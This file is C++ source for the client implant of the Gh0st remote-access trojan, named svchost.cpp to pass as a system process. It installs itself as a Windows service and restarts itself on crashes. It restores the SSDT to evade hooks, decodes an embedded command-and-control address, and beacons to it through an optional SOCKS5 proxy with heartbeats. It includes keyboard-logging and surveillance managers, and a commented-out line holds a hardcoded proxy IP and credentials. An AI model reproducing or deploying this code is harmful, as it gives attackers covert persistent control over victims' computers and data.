// svchost.cpp : Defines the entry point for the console application.
//


#pragma comment(linker, "/OPT:NOWIN98")
#include "ClientSocket.h"
#include "common/KernelManager.h"
#include "common/KeyboardManager.h"
#include "common/login.h"
#include "common/install.h"
#include "common/until.h"
#include "common/resetssdt.h"
//#include "common/hidelibrary.h"
#define MAKEINT64(low, high) ((unsigned __int64)(((DWORD)(low)) | ((unsigned __int64)((DWORD)(high))) << 32))


void __stdcall ServiceMain( int argc, wchar_t* argv[]);
bool __stdcall ResetSSDT();
int TellSCM( DWORD dwState, DWORD dwExitCode, DWORD dwProgress );
void __stdcall ServiceHandlerEx(
								DWORD    dwControl,
								DWORD    dwEventType,
								LPVOID   lpEventData,
								LPVOID   lpContext
    );
#ifdef _CONSOLE
int main(int argc, char **argv);
#else
DWORD WINAPI main(char *lpServiceName);
#endif

SERVICE_STATUS_HANDLE hSrv;
DWORD dwCurrState;
char svcname[MAX_PATH];
LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) {
	// 发生异常，重新创建进程
	MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)svcname, 0, NULL);
	// Block 住
	while (1) Sleep(1000);
	return 0;
}
// 一定要足够长
char	*lpURL = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; // 100 bytes

#ifdef _CONSOLE
#include <stdio.h>
int main(int argc, char **argv)
#else
DWORD WINAPI main(char *lpServiceName)
#endif
{	
#ifdef _CONSOLE
	if (argc < 3)
	{
		printf("Usage:\n %s <Host> <Port>\n", argv[0]);
		return -1;
	}
#endif
	// lpServiceName,在ServiceMain返回后就没有了
	char	strServiceName[256];
	char	strKillEvent[50];
	HANDLE	hInstallMutex = NULL;
	HANDLE	hMonitorThread = INVALID_HANDLE_VALUE;
#ifdef _DLL
	if (CKeyboardManager::g_hInstance != NULL)
	{
		SetUnhandledExceptionFilter(bad_exception);
		ResetSSDT();
		lstrcpy(strServiceName, lpServiceName);
		wsprintf(strKillEvent, "Global\\Gh0st %d", GetTickCount()); // 随机事件名

		hInstallMutex = CreateMutex(NULL, true, lpURL);
		// 重新配置服务
		ReInstallService(strServiceName);
		hMonitorThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorReg, (LPVOID)lpServiceName, 0, NULL);
	}
	// http://hi.baidu.com/zxhouse/blog/item/dc651c90fc7a398fa977a484.html
#endif
	// 告诉操作系统:如果没有找到CD/floppy disc,不要弹窗口吓人
	SetErrorMode( SEM_FAILCRITICALERRORS);
	char	*strPassWord = "password";
	char	*lpszHost = NULL;
	DWORD	dwPort = 80;
	char	*lpszProxyHost = NULL;
	DWORD	dwProxyPort = 0;
	char	*lpszProxyUser = NULL;
	char	*lpszProxyPass = NULL;

	HANDLE	hEvent = NULL;

	CClientSocket socketClient;
	while (1)
	{
		try
		{
#ifdef _DLL
			// 上线间隔为2分
 			if (getLoginInfo(MyDecode(lpURL), &lpszHost, &dwPort, &lpszProxyHost, 
				&dwProxyPort, &lpszProxyUser, &lpszProxyPass))
			{
				if (lpszProxyHost != NULL)
					socketClient.setGlobalProxyOption(PROXY_SOCKS_VER5, lpszProxyHost, dwProxyPort, lpszProxyUser, lpszProxyPass);
				else
					socketClient.setGlobalProxyOption();
				DWORD dwTickCount = GetTickCount();
 				if (socketClient.Connect(lpszHost, dwPort))
				{
#else
 			if (1)
 			{
				lpszHost = argv[1];
				dwPort = atoi(argv[2]);
				//socketClient.setGlobalProxyOption(PROXY_SOCKS_VER5, "124.42.11.114", 1080, "cooldiyer", "gh0st");
 				DWORD dwTickCount = GetTickCount();
 				if (socketClient.Connect(lpszHost, dwPort))
 				{
#endif
					__int64	LoginParam = MAKEINT64(&socketClient, GetTickCount() - dwTickCount);
					// 登录
					DWORD dwExitCode = SOCKET_ERROR;
					// 判断是否有摄像头必须自己一个线程，不然，枚举窗口会失败
					sendLoginInfo((LPVOID)&LoginParam);
					CKernelManager	manager(&socketClient, strServiceName, strKillEvent, lpszHost, dwPort);
					socketClient.setManagerCallBack(&manager);

					//////////////////////////////////////////////////////////////////////////
					DWORD	dwIOCPEvent;
					dwTickCount = GetTickCount();
					do 
					{
						// 每2分发送一次心跳包
						if ((GetTickCount() - dwTickCount) >= 1000 * 60 * 2)
						{
							dwTickCount = GetTickCount();
							BYTE bToken = TOKEN_HEARTBEAT;
							if (socketClient.Send(&bToken, 1) == SOCKET_ERROR)
								break;
						}
						hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
						dwIOCPEvent = WaitForSingleObject(socketClient.m_hEvent, 100);
						
						Sleep(500);
					} while(hEvent == NULL && dwIOCPEvent != WAIT_OBJECT_0);
					
					if (hEvent != NULL)
					{
						socketClient.Disconnect();
						CloseHandle(hEvent);
						break;
					}
				}
			}
			// 1分钟断线重连
			for (int i = 0; i < 1000; i++)
			{
				hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
				if (hEvent != NULL)
				{
					socketClient.Disconnect();
					CloseHandle(hEvent);
					break;
					break;
				}
				Sleep(60);
			}
		}catch(...){}
	}
	SetErrorMode(0);
	ReleaseMutex(hInstallMutex);
	CloseHandle(hInstallMutex);
	TerminateThread(hMonitorThread, -1);
	CloseHandle(hMonitorThread);
	// 我靠，这线程不能退出，一退出，connect就会block住
	while (1) Sleep(1000);
}

BOOL APIENTRY DllMain( HANDLE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:	
	case DLL_THREAD_ATTACH:	
		CKeyboardManager::g_hInstance = (HINSTANCE)hModule;
		CKeyboardManager::m_dwLastInput = GetTickCount();
		break;
	case DLL_PROCESS_DETACH:
        break;
    }

    return TRUE;
}

bool __stdcall ResetSSDT()
{
	return RestoreSSDT(CKeyboardManager::g_hInstance);
}

void __stdcall ServiceMain( int argc, wchar_t* argv[] )
{
    strncpy(svcname, (char*)argv[0], sizeof svcname); //it's should be unicode, but if it's ansi we do it well
    wcstombs(svcname, argv[0], sizeof svcname);

	// RegisterServiceCtrlHandlerEx 收到 SERVICE_CONTROL_SHUTDOWN
    hSrv = RegisterServiceCtrlHandlerEx(svcname, (LPHANDLER_FUNCTION_EX)ServiceHandlerEx, NULL);
    if( hSrv == NULL )
    {
        return;
    }else FreeConsole();

    TellSCM( SERVICE_START_PENDING, 0, 1 );
    TellSCM( SERVICE_RUNNING, 0, 0 );

	HWINSTA hOldStation = GetProcessWindowStation();
	HWINSTA hWinSta = OpenWindowStation("winsta0", FALSE, WINSTA_ACCESSCLIPBOARD | WINSTA_ACCESSGLOBALATOMS | WINSTA_CREATEDESKTOP | WINSTA_ENUMDESKTOPS | WINSTA_ENUMERATE | WINSTA_EXITWINDOWS | WINSTA_READATTRIBUTES | WINSTA_READSCREEN | WINSTA_WRITEATTRIBUTES);
	if (hWinSta != NULL)
		SetProcessWindowStation(hWinSta);
	CloseWindowStation(hOldStation);

    // call Real Service function noew
	MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)svcname, 0, NULL);
    do{
        Sleep(100);//not quit until receive stop command, otherwise the service will stop
    }while(dwCurrState != SERVICE_STOP_PENDING && dwCurrState != SERVICE_STOPPED);

	// 向Lzx学习，Share的进程服务运行后，创建服务线程，停止服务，删除服务，恢复注册表，ServiceMain退出后，线程照样可以运行
	// Own的进程，下次开机后，自动变成Share
    return;
}

int TellSCM( DWORD dwState, DWORD dwExitCode, DWORD dwProgress )
{
    SERVICE_STATUS srvStatus;
    srvStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
    srvStatus.dwCurrentState = dwCurrState = dwState;
    srvStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE | SERVICE_ACCEPT_SHUTDOWN;
    srvStatus.dwWin32ExitCode = dwExitCode;
    srvStatus.dwServiceSpecificExitCode = 0;
    srvStatus.dwCheckPoint = dwProgress;
    srvStatus.dwWaitHint = 1000;
    return SetServiceStatus( hSrv, &srvStatus );
}

void __stdcall ServiceHandlerEx(
								DWORD    dwControl,
								DWORD    dwEventType,
								LPVOID   lpEventData,
								LPVOID   lpContext
    )
{
    // not really necessary because the service stops quickly
    switch( dwControl )
    {
    case SERVICE_CONTROL_STOP:
        TellSCM( SERVICE_STOP_PENDING, 0, 1 );
        Sleep(10);
        TellSCM( SERVICE_STOPPED, 0, 0 );
        break;
    case SERVICE_CONTROL_PAUSE:
        TellSCM( SERVICE_PAUSE_PENDING, 0, 1 );
        TellSCM( SERVICE_PAUSED, 0, 0 );
        break;
    case SERVICE_CONTROL_CONTINUE:
        TellSCM( SERVICE_CONTINUE_PENDING, 0, 1 );
        TellSCM( SERVICE_RUNNING, 0, 0 );
        break;
    case SERVICE_CONTROL_INTERROGATE:
        TellSCM( dwCurrState, 0, 0 );
        break;
    case SERVICE_CONTROL_SHUTDOWN:
        TellSCM( SERVICE_STOPPED, 0, 0 );
        break;
    }
}
